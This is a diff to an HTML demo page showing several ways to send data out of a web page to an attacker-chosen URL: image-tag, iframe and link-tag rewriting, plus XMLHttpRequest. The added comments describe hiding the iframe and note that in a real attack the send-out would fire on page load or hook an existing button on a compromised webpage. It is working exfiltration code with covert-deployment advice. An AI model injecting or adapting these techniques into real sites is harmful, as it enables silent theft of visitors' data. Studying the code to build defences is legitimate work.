@@ -31,17 +31,19 @@
 		var dataElement="?data=";
 		function setImgProxy(targetURL){
 			var imgData="someData sent by image proxy";
+			<!-- the actual update of the targetURL -->
 			document.getElementById("imageProxy").src=targetURL+dataElement+"imgProxyData: "+imgData;
 			document.getElementById("pInfo").innerHTML="using ImageProxy: data send to "+targetURL+"\n{"+imgData+"}";
 		}
 		function setIframeProxy(targetURL){
-		
 			var iframeData="someData sent by iframe proxy";
+			<!-- the actual update of the targetURL -->
 			document.getElementById("imageProxy").src=targetURL+dataElement+"iframeProxyData: "+iframeData;
 			document.getElementById("pInfo").innerHTML="using iframeProxy: data send to "+targetURL+"\n{"+iframeData+"}";
 		}
 		function setLinkProxy(targetURL){
 			var linkData="someData sent by link proxy";
+			<!-- the actual update of the targetURL -->
 			document.getElementById("linkProxy").href=targetURL+dataElement+"linkProxyData: "+linkData;
 			document.getElementById("pInfo").innerHTML="link tags target url has been modified. click link to send data.";
 			document.getElementById("linkProxy").innerHTML="LINK TAG (modified)";
@@ -82,12 +84,13 @@
 		<!-- setLandingPage(); -->
 	</script>
 	
-	
+	<!-- using simple XMLHttpRequest to try to send out data, this will typically fail for most cases -->
 	<p>Link to send data via XMLHttpRequest:</p>
 	<p>
 		<a href="#" onclick=javascript:sendData(getTargetURL());>SEND</a>
 	</p>
 
+	<!-- using an image tag and some scripting see function setImgProxy() -->
 	<br></br>
 	<div class="proxyTag">
 		<p>image tag</p>
@@ -95,18 +98,26 @@
 		<img src="#" id="imageProxy"> IMAGE TAG</img>
 		<br></br>
 	</div>
+
+	<!-- modifying a link tag to your liking -->
 	<div class="linkproxyTag">
 		<p>link tag (modifying target address of link)</p>
 		<a href="#" id="linkProxy">LINK TAG</a>
 		<br></br>
 	</div>
+
+	<!-- using an iframe to send out the data -->
 	<div class="proxyTag">
 		<p>iframe tag</p>
-		<!-- hidden image version just uses style="display:none" -->
+		<!-- hidden iframe version just uses style="display:none" -->
 		<iframe style="height:50px" src="" id="iframeProxy"> IFRAME TAG</iframe>
 		<br></br>
 	</div>
 	
+	<!-- 	in this example the buttonclick triggers the update of the targetURL and therefore the data sendout. 
+		in an actual case you would probably use some trigger like 'onload' or connect it to an existing button/action
+		on the compromised webpage.
+	-->
 	<button onclick=javascript:setImgProxy(getTargetURL());>useImgProxy</button>
 	<br></br>
 	<button onclick=javascript:setLinkProxy(getTargetURL());>useLinkProxy</button>
